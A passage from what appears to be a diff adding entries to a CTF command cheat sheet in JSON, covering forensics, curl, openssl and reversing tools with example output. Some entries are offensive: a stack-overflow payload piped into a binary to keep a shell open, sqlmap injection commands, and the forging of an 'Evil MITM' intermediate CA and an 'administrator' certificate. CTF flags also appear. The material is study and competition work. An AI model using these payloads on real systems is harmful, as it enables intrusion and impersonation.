→ 2564 [RST] Seq=1 Win=26883 Len=0 MSS=1360 SACK_PERM=1 WS=128 8200 2564\n   16   5.175748    10.0.0.10 → 3.16.9.89    TCP 54 20 → 1234 [SYN] Seq=0 Win=8192 Len=0 20 1234\n   17   5.689558    10.0.0.10 → 3.16.9.89    TCP 54 20 → 1337 [SYN] Seq=0 Win=8192 Len=0 20 1337\n   18   6.205231    10.0.0.10 → 3.16.9.89    TCP 54 20 → 7777 [SYN] Seq=0 Win=8192 Len=0 20 7777\n   19   6.718092    10.0.0.10 → 3.16.9.89    TCP 66 2565 → 8200 [SYN] Seq=0 Win=8192 Len=0 MSS=1460 WS=256 SACK_PERM=1 2565 8200\n   20   6.913198    3.16.9.89 → 10.0.0.10    TCP 66 8200 → 2565 [SYN, ACK] Seq=0 Ack=1 Win=26883 Len=0 MSS=1360 SACK_PERM=1 WS=128 8200 2565"
+    ],
+    [
+      "Forensics",
+      "Audio",
+      "0",
+      "No",
+      "sox \u003caudio_file\u003e  -n spectrogram",
+      "Dump audio file spectrogram. \nBy default, will create a file named \"spectrogram.png\".",
+      "https://linux.die.net/man/1/sox",
+      "sox audio.wav  -n spectrogram"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "cat \u003c(python -c \"print(('A' * 76) + '\\x08\\x87\\x04\\x08')\") - | ./authme",
+      "Redirect into executable stdin, then keep stdin open.",
+      "https://security.stackexchange.com/questions/73878/program-exiting-after-executing-int-0x80-instruction-when-running-shellcode\nhttps://unix.stackexchange.com/questions/297560/cat-into-stdin-then-pipe-into-program-keeps-forked-shell-open-why\nhttps://www.gnu.org/software/bash/manual/bash.html#Process-Substitution\nhttps://unix.stackexchange.com/questions/159513/what-are-the-shells-control-and-redirection-operators",
+      "# python -c \"print(('A' * 76) + '\\x08\\x87\\x04\\x08')\" | ./authme\nPlease insert the secret password:\nIncorrect password!\nSegmentation fault\n\n# cat \u003c(python -c \"print(('A' * 76) + '\\x08\\x87\\x04\\x08')\") - | ./authme\nPlease insert the secret password:\nIncorrect password!\nls\nauthme  authme.c"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "(python -c \"print(('A' * 76) + '\\x08\\x87\\x04\\x08')\"; cat) | ./authme",
+      "Redirect into executable stdin, then keep stdin open.",
+      "https://stackoverflow.com/questions/6270440/simple-logical-operators-in-bash/6270803#6270803\nhttps://www.gnu.org/software/bash/manual/bashref.html#Command-Grouping",
+      "# python -c \"print(('A' * 76) + '\\x08\\x87\\x04\\x08')\" | ./authme\nPlease insert the secret password:\nIncorrect password!\nSegmentation fault\n\n# (python -c \"print(('A' * 76) + '\\x08\\x87\\x04\\x08')\"; cat) | ./authme\nPlease insert the secret password:\nIncorrect password!\nls\nauthme  authme.c"
+    ],
+    [
+      "Network and Web",
+      "Fetch",
+      "20",
+      "No",
+      "curl \u003curl\u003e -X POST --data \"\u003cparam1\u003e=\u003cval1\u003e&\u003cparam2\u003e=\u003cval2\u003e\"",
+      "Fetch documents/files from servers with a POST request.\n\nNote: \"--data\" performs some processing on the data. \nTo avoid processing, use \"--data-binary\".\nIf you start the data with the letter @, the rest should be a filename.",
+      "https://curl.haxx.se/docs/manpage.html",
+      "# curl \"http://web3.tamuctf.com/science\" -X POST --data \"chem1=a&chem2=b\"\n\u003chtml\u003e\n        \u003cdiv style=\"text-align:center\"\u003e\n        \u003ch3\u003eThe result of combining a and b is:\u003c/h3\u003e\u003c/br\u003e\n        \u003ciframe src=\"https://giphy.com/embed/AQ2tIhLp4cBa\" width=\"468\" height=\"480\" frameBorder=\"0\" class=\"giphy-embed\" allowFullScreen\u003e\u003c/iframe\u003e\u003c/div\u003e\n\u003c/html\u003e"
+    ],
+    [
+      "Network and Web",
+      "Fetch",
+      "30",
+      "No",
+      "curl \u003curl\u003e -H 'Content-Type: application/json; charset=UTF-8' --data-binary '{\"\u003cparam1\u003e\":\"\u003cval1\u003e\"}'",
+      "Fetch documents/files from servers with a JSON request.",
+      "https://gist.github.com/subfuzion/08c5d85437d5d4f00e58",
+      "# curl 'http://35.207.132.47/api/login' -H 'Content-Type: application/json; charset=UTF-8' --data-binary '{\"email\":\"admin\"}'"
+    ],
+    [
+      "Forensics",
+      "Images",
+      "0",
+      "No",
+      "zbarimg \u003cimg_with_qr_code\u003e",
+      "Decode QR Code from image.",
+      "http://manpages.ubuntu.com/manpages/bionic/man1/zbarimg.1.html",
+      "root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# zbarimg a.png\nQR-Code:otpauth://totp/TAMU_CTF?secret=TKH4FPK7FOEXG7VW\nscanned 1 barcode symbols from 1 images in 0.17 seconds"
+    ],
+    [
+      "SQL",
+      "sqlmap",
+      "70",
+      "No",
+      "sqlmap -u \"\u003curl\u003e*\"",
+      "Use an \"Arbitrary Injection Point\" for an SQL Injection attack.",
+      "http://sqlmap.org/\nhttp://pentestmonkey.net/blog/exploiting-a-tricky-sql-injection-with-sqlmap",
+      "sqlmap -u \"http://localhost:8000/?*\" --dbms=MySQL --technique=B"
+    ],
+    [
+      "SQL",
+      "sqlmap",
+      "80",
+      "No",
+      "sqlmap -u \u003curl\u003e --random-agent",
+      "Don't use the SQLMap user agent when performing SQL Injections.",
+      "http://sqlmap.org/",
+      "sqlmap -u http://web2.tamuctf.com/Search.php?Search=1 --random-agent  --dbms=MySQL --technique=B --level 5 --risk 3"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "cat \u003cfile\u003e | head -n \u003cline_number\u003e | tail -1",
+      "Get n-th line.",
+      "",
+      "for i in 1 4 5 6 7; do ./reversing1 | head -n $i | tail -1 | base64 -d; echo \"\"; done"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "egrep \"^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4})$\"",
+      "Regex for Base64 encoded text.",
+      "",
+      "strings reversing1 | egrep \"^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4})$\" | while read line ; do echo $line | base64 -d | cat -v && echo \"\"; done\n"
+    ],
+    [
+      "Forensics",
+      "Images",
+      "0",
+      "No",
+      "pngcheck \u003cimg\u003e",
+      "pngcheck verifies the integrity of PNG files.",
+      "http://www.libpng.org/pub/png/apps/pngcheck.html",
+      "root@kali:/media/sf_CTFs/tamu/I_heard_you_like_files# pngcheck art.png\nart.png  additional data after IEND chunk\nERROR: art.png"
+    ],
+    [
+      "Forensics",
+      "PDFs",
+      "0",
+      "No",
+      "pdf-parser.py -v \u003cfile\u003e",
+      "Inspect PDF files and find malformed elements.\nMalformed elements are printed with a \"todo\" prefix.",
+      "https://blog.didierstevens.com/2009/05/14/malformed-pdf-documents/",
+      "root@kali:/media/sf_CTFs/tamu/I_heard_you_like_files/pdfs# file 1485.pdf\n1485.pdf:   PDF document, version 1.5\nroot@kali:/media/sf_CTFs/tamu/I_heard_you_like_files/pdfs# python ~/utils/pdftools/pdf-parser.py -v 1485.pdf | grep \"todo\"\ntodo 10: 3 'ZmxhZ3tQMGxZdEByX0QwX3kwdV9HM3RfSXRfTjB3P30K'"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "tr",
+      "Utility for translating, or deleting, or squeezing repeated characters",
+      "https://www.thegeekstuff.com/2012/12/linux-tr-command/"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "awk '{ printf $2 }'",
+      "Print n-th word in line.",
+      "https://www.geeksforgeeks.org/awk-command-unixlinux-examples/",
+      "$ echo \"one two three four\" | awk '{ printf $2 }'\ntwo\n\n$ curl -A \"Googlebot\" http://web5.tamuctf.com/robots.txt\nUser-agent: *\n\nTHE HUMANS SUSPECT NOTHING!\nHERE IS THE SECRET INFORMATION: gigem{be3p-bOop_rob0tz_4-lyfe}\nLONG LIVE THE GOOGLEBOTS!\n$ curl -s -A \"Googlebot\" http://web5.tamuctf.com/robots.txt | awk '/gigem/ { print $6 }'\ngigem{be3p-bOop_rob0tz_4-lyfe}"
+    ],
+    [
+      "Network and Web",
+      "Fetch",
+      "40",
+      "No",
+      "curl -d \"\u003cparam1\u003e=\u003cdata1\u003e\" --data-urlencode \"\u003cparam2\u003e=\u003cvalue2_to_be_encoded\u003e\" -X POST \u003curl\u003e",
+      "Fetch documents/files from servers, encode part of the request.",
+      "https://ec.haxx.se/http-post.html",
+      "# curl -d \"username=admin\" --data-urlencode \"password=tS&LjHue6Z&m*&JeTU#U%btyA8gmJXh\" -X POST http://web1.tamuctf.com/web/login.php\n\u003chtml\u003egigem{f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7}!\u003c/html\u003e"
+    ],
+    [
+      "Forensics",
+      "Android",
+      "0",
+      "No",
+      "apktool -d \u003cfile\u003e",
+      "Decompose Android APK file.",
+      "https://ibotpeaches.github.io/Apktool/",
+      "root@kali:/media/sf_CTFs/tamu/_Secrets# apktool d howdyapp.apk\nI: Using Apktool 2.3.4-dirty on howdyapp.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: /root/.local/share/apktool/framework/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files..."
+    ],
+    [
+      "Python",
+      "Decompile",
+      "0",
+      "No",
+      "uncompyle6 \u003cfile.pyc\u003e",
+      "Decompile Python executable.",
+      "https://github.com/rocky/python-uncompyle6",
+      "root@kali:/media/sf_CTFs/tamu/Snakes_over_cheese# uncompyle6 reversing2.pyc\n# uncompyle6 version 3.2.5\n# Python bytecode 2.7 (62211)\n# Decompiled from: Python 2.7.15 (default, May  1 2018, 05:55:50)\n# [GCC 7.3.0]\n# Embedded file name: reversing2.py\n# Compiled at: 2018-10-07 22:28:58\nfrom datetime import datetime\nFqaa = [102, 108, 97, 103, 123, 100, 101, 99, 111, 109, 112, 105, 108, 101, 125]\nXidT = [83, 117, 112, 101, 114, 83, 101, 99, 114, 101, 116, 75, 101, 121]\n\ndef main():\n    print 'Clock.exe'\n    input = raw_input('\u003e: ').strip()\n    kUIl = ''\n    for i in XidT:\n        kUIl += chr(i)\n\n    if input == kUIl:\n        alYe = ''\n        for i in Fqaa:\n            alYe += chr(i)\n\n        print alYe\n    else:\n        print datetime.now()\n\n\nif __name__ == '__main__':\n    main()\n# okay decompiling reversing2.pyc"
+    ],
+    [
+      "Network and Web",
+      "Fetch",
+      "50",
+      "No",
+      "curl -I \u003curl\u003e",
+      "Fetch headers only.",
+      "https://curl.haxx.se/docs/manpage.html#-I",
+      "$ curl -I https://tamuctf.com\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sat, 23 Mar 2019 13:58:01 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 4365\nConnection: keep-alive\n"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "ascii_char=$(printf \"$(printf %x \u003cdecimal_ascii_code\u003e)\" | xxd -p -r)",
+      "Convert decimal ASCII code to char.",
+      "",
+      "$ ascii_char=$(printf \"$(printf %x 48)\" | xxd -p -r)\n$ echo $ascii_char\n0"
+    ],
+    [
+      "Command Line",
+      "Snippets",
+      "0",
+      "No",
+      "echo 'hello world' | grep -oP 'hello \\K(world)'",
+      "\\K is a lookbehind alternative, telling the engine to start capturing only after it.\n\n-Po tells grep to work with Perl-compatible expressions (P) and to and to print only the matched (non-empty) parts of a matching line (o).",
+      "https://stackoverflow.com/questions/33573920/what-does-k-mean-in-this-regex",
+      "~$ echo 'hello world' | grep -oP 'hello \\K(world)'\nworld\n~$ echo 'hello world' | grep -oP 'hello (world)'\nhello world"
+    ],
+    [
+      "Executables",
+      "Radare2",
+      "180",
+      "No",
+      "agf \u003e graph.txt",
+      "Export graph into text file.",
+      "https://stackoverflow.com/questions/45426577/getting-full-binary-control-flow-graph-from-radare2"
+    ],
+    [
+      "Network and Web",
+      "TLS",
+      "0",
+      "No",
+      "nmap -p 443 --script ssl-cert \u003chostname\u003e",
+      "View certificate details.",
+      "",
+      "# nmap -p 443 --script ssl-cert missilesys.com\nStarting Nmap 7.70 ( https://nmap.org ) at 2019-05-12 20:37 IDT\nNmap scan report for missilesys.com (35.246.158.51)\nHost is up (0.0098s latency).\nrDNS record for 35.246.158.51: 51.158.246.35.bc.googleusercontent.com\n\nPORT    STATE SERVICE\n443/tcp open  https\n| ssl-cert: Subject: commonName=missilesys.com\n| Subject Alternative Name: DNS:missilesys.com, IP Address:35.198.135.201\n| Issuer: organizationName=International Weapons Export Inc.\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2019-04-20T09:12:01\n| Not valid after:  2020-04-19T09:12:01\n| MD5:   b023 7df6 4040 57fb f26e 0d38 0955 874e\n|_SHA-1: 4445 b350 b422 5dc7 1bcc 947c fa06 d48b 514f e580"
+    ],
+    [
+      "Network and Web",
+      "TLS",
+      "0",
+      "No",
+      "curl \u003curl\u003e -k",
+      "Fetch HTTPS URL while ignoring certificate verification.",
+      "",
+      "curl https://missilesys.com/ -v -k\n*   Trying 35.246.158.51...\n* TCP_NODELAY set\n* Connected to missilesys.com (35.246.158.51) port 443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n* successfully set certificate verify locations:\n*   CAfile: none\n  CApath: /etc/ssl/certs\n* (304) (OUT), TLS handshake, Client hello (1):\n* (304) (IN), TLS handshake, Server hello (2):\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\n* TLSv1.2 (IN), TLS handshake, Request CERT (13):\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\n* TLSv1.2 (OUT), TLS handshake, Certificate (11):\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\n* TLSv1.2 (OUT), TLS change cipher, Client hello (1):\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\n* TLSv1.2 (IN), TLS handshake, Finished (20):\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\n* ALPN, server accepted to use http/1.1\n* Server certificate:\n*  subject: CN=missilesys.com\n*  start date: Apr 20 09:12:01 2019 GMT\n*  expire date: Apr 19 09:12:01 2020 GMT\n*  issuer: O=International Weapons Export Inc.\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\n\u003e GET / HTTP/1.1\n\u003e Host: missilesys.com\n\u003e User-Agent: curl/7.61.0\n\u003e Accept: */*"
+    ],
+    [
+      "Crypto",
+      "OpenSSL",
+      "0",
+      "No",
+      "openssl req -in \u003ccsr\u003e -text -noout",
+      "View certificate signing request (CSR) details.",
+      "",
+      "# openssl req -in user.csr -text -noout\nCertificate Request:\n    Data:\n        Version: 1 (0x0)\n        Subject: CN = user\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                RSA Public-Key: (2048 bit)\n                Modulus:\n                    00:c4:73:32:37:1b:b1:1c:92:fb:e2:8e:af:ac:d9:\n                    91:37:26:15:a7:94:a7:2d:08:c5:53:d6:4a:13:53:\n                    7b:6a:55:59:35:18:6d:55:5d:2d:10:6e:54:86:24:\n                    96:3a:7d:55:3f:7b:9f:87:5e:ab:82:e7:92:ae:7d:\n                    72:6c:05:13:2f:e1:0d:2f:47:73:e0:61:d6:1a:0f:\n                    1c:9e:08:eb:3e:6b:c9:6d:e7:19:b7:73:eb:c8:17:\n                    ef:31:fb:3c:47:b7:34:fb:70:7e:6d:87:e1:17:85:\n                    a3:90:84:ec:59:81:18:13:f5:d2:8b:7b:1c:86:1d:\n                    99:40:9d:3c:b1:68:26:1a:73:26:aa:67:66:3c:86:\n                    cf:80:72:1c:c7:b2:0e:78:ab:49:ca:12:f8:36:b1:\n                    e7:b9:5b:69:2b:90:cf:b9:42:e4:bb:79:a4:46:81:\n                    54:9b:b5:be:19:4b:6e:f3:66:dc:55:e8:6e:41:99:\n                    c7:0e:28:f7:e6:df:50:c8:09:f8:92:e6:6b:cf:dc:\n                    66:3e:9f:bc:09:7c:6e:19:e2:ee:c6:60:b2:d1:75:\n                    d2:28:95:bb:70:8a:6a:9d:fd:bb:83:77:41:ec:e2:\n                    45:09:d3:56:46:b7:e1:07:c2:8e:fe:f6:d9:47:cb:\n                    84:b7:3e:ae:40:b1:d0:14:d5:c3:54:4f:09:d1:84:\n                    2c:57\n                Exponent: 65537 (0x10001)\n        Attributes:\n        Requested Extensions:\n            X509v3 Subject Key Identifier:\n                6D:2D:64:46:6C:74:16:AD:ED:B6:05:A2:B4:1A:DC:9B:26:E3:3C:0A\n    Signature Algorithm: sha1WithRSAEncryption\n         86:76:e9:d5:98:4c:20:da:43:54:0b:64:9e:4c:b4:a4:01:dd:\n         eb:1e:eb:d0:56:89:9a:8d:90:c5:13:16:a7:8f:41:09:d3:d5:\n         e8:62:d2:e0:94:e5:78:d4:b3:de:ec:fc:fa:23:4f:c1:30:aa:\n         59:39:5e:15:b0:3b:3a:c9:d7:d6:96:0f:78:c1:a2:1c:92:a1:\n         3c:b1:e0:f9:39:5f:9b:7a:33:5d:cd:63:7e:c9:03:5d:42:7b:\n         1a:e0:9a:1c:99:d4:7f:81:6e:6e:38:13:56:42:8b:d9:0e:6c:\n         66:de:c4:58:fd:cf:21:bc:3c:c7:96:4c:51:51:82:41:ab:5d:\n         7b:d6:cb:4d:ff:b5:b0:cc:59:e5:22:66:03:7a:f7:79:85:d2:\n         2a:01:17:13:f7:8f:22:77:a5:2f:84:0f:53:b7:cd:b8:ae:7e:\n         e4:05:5d:be:e8:88:78:13:4e:23:a2:b9:a6:2a:89:3d:03:c5:\n         64:81:1f:d6:5e:be:77:b1:c0:81:40:77:ee:66:74:34:22:cc:\n         b8:ee:a4:3b:e0:a8:70:22:83:5f:53:c7:f9:c5:d6:d6:77:9e:\n         d5:83:3c:bc:a6:69:11:d6:f5:41:b2:37:43:07:22:de:ae:0f:\n         09:3d:71:17:9b:5d:94:5d:26:83:a9:c4:42:9f:3d:80:00:32:\n         fd:a4:ba:d7"
+    ],
+    [
+      "Crypto",
+      "OpenSSL",
+      "0",
+      "No",
+      "openssl pkcs12 -info -in \u003cpfx file\u003e",
+      "View PKCS#12 details.",
+      "",
+      "# openssl pkcs12 -info -in user.p12\nEnter Import Password:\nMAC: sha1, Iteration 2048\nMAC length: 20, salt length: 8\nPKCS7 Encrypted data: pbeWithSHA1And40BitRC2-CBC, Iteration 2048\nCertificate bag\nBag Attributes\n    localKeyID: A0 AE D7 F1 54 72 79 71 D8 04 6E 0C E7 69 5A CD 07 C5 3F 1D\nsubject=CN = user\n\nissuer=O = International Weapons Export Inc.\n\n-----BEGIN CERTIFICATE-----\nMIIC4jCCAcqgAwIBAgIBATANBgkqhkiG9w0BAQsFADAsMSowKAYDVQQKDCFJbnRl\ncm5hdGlvbmFsIFdlYXBvbnMgRXhwb3J0IEluYy4wHhcNMTkwNTEyMTgwMDQxWhcN\nMjAwNTExMTgwMDQxWjAPMQ0wCwYDVQQDDAR1c2VyMIIBIjANBgkqhkiG9w0BAQEF\nAAOCAQ8AMIIBCgKCAQEAxHMyNxuxHJL74o6vrNmRNyYVp5SnLQjFU9ZKE1N7alVZ\nNRhtVV0tEG5UhiSWOn1VP3ufh16rgueSrn1ybAUTL+ENL0dz4GHWGg8cngjrPmvJ\nbecZt3PryBfvMfs8R7c0+3B+bYfhF4WjkITsWYEYE/XSi3schh2ZQJ08sWgmGnMm\nqmdmPIbPgHIcx7IOeKtJyhL4NrHnuVtpK5DPuULku3mkRoFUm7W+GUtu82bcVehu\nQZnHDij35t9QyAn4kuZrz9xmPp+8CXxuGeLuxmCy0XXSKJW7cIpqnf27g3dB7OJF\nCdNWRrfhB8KO/vbZR8uEtz6uQLHQFNXDVE8J0YQsVwIDAQABoywwKjAJBgNVHRME\nAjAAMB0GA1UdDgQWBBRtLWRGbHQWre22BaK0GtybJuM8CjANBgkqhkiG9w0BAQsF\nAAOCAQEAK53ccwjm0BSOdgFhrKH8YUnsH2T6mFBt4x3oidVuS3HyVHSnCsLVKAiU\nFuuGKq2SbHIrEQwwdoI5Lnw5OeXEzsGpvzEGKFs5QaABCRflg1lOsQimc8ciTZ1r\nBY8EpC2YTmV9b837PU6/C3mvDEc74AywYp/EKS+4pEsIn/XVDCQ5DuOqKkhF2BAE\nHzm5n7nsGf2oEBq/YkquQ1AX1yZtyrWBAQQxTJAx/+Fl3Rnd//pfgc9YA+xDqPd+\nSmJMNDA84VTrU2TtNRzkhw5BND5SCbXjHJhaAIpemwt+fZCFLVARvWvDNq/9w/UZ\neH+uSIgT06HgYluFm27oowwYNlouDw==\n-----END CERTIFICATE-----\nEnter PEM pass phrase:\nVerifying - Enter PEM pass phrase:\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFHDBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIekaYQxMj9iwCAggA\nMAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECBsX2X0EXQE+BIIEyEJHWDFVQw1t\nWglw0fePUq3+9IWLTBwmYH1z3DmW5IoLBnbdLjdFIfI3UpEpZCAWCvX6f7XmVtI3\nF2RtbJ5ThdWa+QbF+1jd98//j0nxnzxOnhIO15JdTwKTR+e0Kn9jDEXvpNr+Pc/C\n38pu3QHdGp0eOr5zs0H4/mrUviUQx9QfGNgj19XFhtn4NWEF8h4r9AH/cHpVDrN2\nzhoOsco6W7q2oxmB8A1w4NrifuUCovCiK4eFPmzBX+H0zYUZ0JFaigHOLOXpZuXh\nr5QRw37+Mlon/5LhGLP7D00Libu3ozksaY/3mqCnwz9YrAuA5wKcqe1fwJG2LhTO\nIjb1uKqORtLVKV2xeacML0U+XZFryBF1z9pR0M0InNWtgHj/O2fwKvRLR7vVJCuK\nJay5VTWNp5NqeD8M4ZsQWQL9f0thsvV0Ouh/wAFEcQ4DQGk1omXeiSn3cWKV7T+3\n9p2aIZiEGVRKiDb3Z0PVUzXgMuMnr7ErMPhAIRdbXDIbkkg5eqHVhw1U9nmFpZPk\nIUccpUQxztM8zipKuSrVMsaaP4jI64unNuNbHgV4UtYHz6KFNee/Y0L2DCnzdLMt\n437BttCC85TSf1Vsb02lZoiPcTEjq2/jKzXOBH1RMVM9OGwDFkU85T4IOxT8KQM8\n+Uk2+mD4fpnOcXYZTkatMm3F/U/d5Hzmwe8BbBuVFzYMlkG4UvExa1/GAYDAhTiw\nQppC2E82Rv1V7IrS0l5airb3HBfPjpjX+kMiH/2QqIhjyMBITCMiVTCAYmMtvKLt\n11kD+goqaW8PdsriNJxVK5ydR5j9MsdzRPmKY0hw07s0IIj8QQFF3isgQlREgEmw\nnz1EE/sM7tn8j0GiEhYUxZMLqtpg65fe373Nvjd5ik4FNS+L1kHUuxb7iOHS5yEQ\nJoAsidtgbzQqNM8XLZbz12th/WJE1qtYKzAxFP2MQZ4JbLvtmRDFGcH9ewVOKY5e\nL2ynk3/gGzY6nHtqW1cDOGsM/U6PNKQ5ays2MY9XlDpNAo5STTuYNQquEKfugnk8\nvugRcm4kLc3TCtfsSDjCVACCUm3u1e8/MeopNQ9bDFxyjrRJcUkDefdGEr7qpuMy\nSmxBOHSzIUQXH7kJO2k4vW49N8af3ruO4LmrDn16IxWgq4jwfArSMsH92Afu5LmJ\n+dB6txxSHBcbN4wAKXuJGsy3qwLyOL+lKFuffaidxhsjdFNeL5pe/IQfEjJ5+ED3\nlVpArp0UAd5wlH6R7mzlq0YdDhJsdw25WPRC5Rpkoe10Ue0q37H5D4T6pCOQg70s\nkny8fJedrVjxVdY7hYwUBXUjZSBPH0G7AWEqsYBaU5TNHizjFGEOnMVm0qhhJiPV\nF0zwwdFv0VwCzYYmeYAVLbaHWuVmDoYU42kv8wBXoRYFrPuAy4QQOMvPaYbikYc6\n4+3dNagvyBGIeMgg7ZEypqQMGtkuPN1fbt3c5WMaA0Hs+VFZJSJcEEjHcUQgrGqO\nqPGkq9AhJPV8puHvassE0kqzSQnGUNuOsVFyV4uOIrvc4cSmn1CQjMGxW3FRbGHm\nwbtEA82E9Pte/HCl0gs7EJEI6nrMV25CwgQxdnhR07hQTizeUo+aBpCHuZrwp4ud\nZndmJx9urwUzSRHY4wZVhw==\n-----END ENCRYPTED PRIVATE KEY-----"
+    ],
+    [
+      "Crypto",
+      "OpenSSL",
+      "0",
+      "No",
+      "openssl pkcs12 -in \u003cinput_pfx_file\u003e  -clcerts -nokeys -out \u003coutput_certificate_file\u003e",
+      "Extract certificates from PKCS#12 file.",
+      "",
+      "openssl pkcs12 -in user.p12  -clcerts -nokeys -out user.pem\nEnter Import Password:"
+    ],
+    [
+      "Crypto",
+      "OpenSSL",
+      "0",
+      "No",
+      "openssl genrsa -out \u003coutput_key_name\u003e \u003csize\u003e",
+      "Generate RSA private key pair.",
+      "",
+      "openssl genrsa -out intermediate_key.pem 2048\nGenerating RSA private key, 2048 bit long modulus (2 primes)\n............................................................................................................+++++\n...................+++++\ne is 65537 (0x010001)"
+    ],
+    [
+      "Crypto",
+      "OpenSSL",
+      "0",
+      "No",
+      "openssl req -addext \u003cextension\u003e -outform pem -out \u003cout_csr_name\u003e -key \u003cinput_csr_key\u003e -new",
+      "Generate CSR with extension.",
+      "",
+      "openssl req -addext basicConstraints=critical,CA:TRUE,pathlen:1 -outform pem -out intermediate_csr.pem -key intermediate_key.pem -new\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:.\nState or Province Name (full name) [Some-State]:.\nLocality Name (eg, city) []:.\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:.\nOrganizational Unit Name (eg, section) []:.\nCommon Name (e.g. server FQDN or YOUR name) []:Evil MITM\nEmail Address []:.\n\nPlease enter the following 'extra' attributes\nto be sent with your certificate request\nA challenge password []:\nAn optional company name []:"
+    ],
+    [
+      "Crypto",
+      "OpenSSL",
+      "0",
+      "No",
+      "openssl x509 -req -in \u003cchild_csr\u003e -CA \u003cparent_certificate\u003e -CAkey \u003cparent_key\u003e -CAcreateserial -out \u003coutput_child_name\u003e  -days \u003cvalidity_days\u003e -sha256 -extfile \u003cextension\u003e",
+      "Sign child CSR with parent.",
+      "",
+      "root@kali:/media/sf_CTFs/mosad/2# openssl genrsa -out leaf_key.pem 2048\nGenerating RSA private key, 2048 bit long modulus (2 primes)\n...............................................+++++\n........................+++++\ne is 65537 (0x010001)\nroot@kali:/media/sf_CTFs/mosad/2# openssl req -new -key leaf_key.pem -out leaf_csr.pem\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:.\nState or Province Name (full name) [Some-State]:.\nLocality Name (eg, city) []:.\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:.\nOrganizational Unit Name (eg, section) []:.\nCommon Name (e.g. server FQDN or YOUR name) []:administrator\nEmail Address []:.\n\nPlease enter the following 'extra' attributes\nto be sent with your certificate request\nA challenge password []:\nAn optional company name []:\nroot@kali:/media/sf_CTFs/mosad/2# cat leaf.ext\nbasicConstraints=CA:FALSE\nsubjectKeyIdentifier=hash\nroot@kali:/media/sf_CTFs/mosad/2# openssl x509 -req -in leaf_csr.pem -CA intermediate.pem -CAkey intermediate_key.pem -CAcreateserial -out leaf.pem  -days 1825 -sha256 -extfile leaf.ext\nSignature ok\nsubject=CN = administrator\nGetting CA Private Key"
+    ],
+    [
+      "Crypto",
+      "OpenSSL",
+      "0",
+      "No",
+      "openssl pkcs12 -export  -inkey \u003ckey_file\u003e -in \u003ccert_file\u003e -certfile \u003cparent_certs\u003e -out \u003coutput_name\u003e",
+      "Create PKCS#12 file.",
+      "",
+      "root@kali:/media/sf_CTFs/mosad/2# openssl pkcs12 -export  -inkey leaf_key.pem -in leaf.pem -certfile intermediate.pem -out final.pfx\nEnter Export Password:\nVerifying - Enter Export Password:"
+    ],
+    [
+      "Network and Web",
+      "HTTP",
+      "0",
+      "No",
+      "GET / HTTP/1.0",
+      "Raw HTTP GET request.",
+      "",
+      "GET / HTTP/1.0\n\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 5374\nSet-Cookie: SID=123; Domain=.missilesystem.com; Expires=Tue, 11-Jun-2019 19:59:23 GMT; Path=/\nDate: Sun, 12 May 2019 19:59:23 GMT\nServer: Cheroot/6.5.4\n\n\u003chtml\u003e\n    \u003c!-- ... --\u003e\n\t\u003cbody\u003e\n\t\t\u003cdiv id=\"title\" class=\"level1_title\"\u003e\n\t\t\t\u003cdiv id=\"welcome\"\u003e\n\t\t\t\t\u003cspan\u003eWelcome to Management System!\u003c/span\u003e\n\t\t\t\u003c/div\u003e\n            \u003cdiv id=\"settings\"\u003e\u003cspan\u003e\u003ca href=\"/settings\"\u003esettings\u003c/a\u003e\u003c/span\u003e\u003c/div\u003e\n\t\t\u003c/div\u003e\n\t\t\u003cdiv id=\"status\"\u003e\n\t\t\t\u003cdiv id=\"managemenetstatus\"\u003e\n\t\t\t\t\u003cdiv id=\"managemenetstatus_title\" class=\"level2_title\"\u003e\n\t\t\t\t\t\u003cspan class=\"name\"\u003eManagement Status\u003c/span\u003e\n\t\t\t\t\t\u003cspan 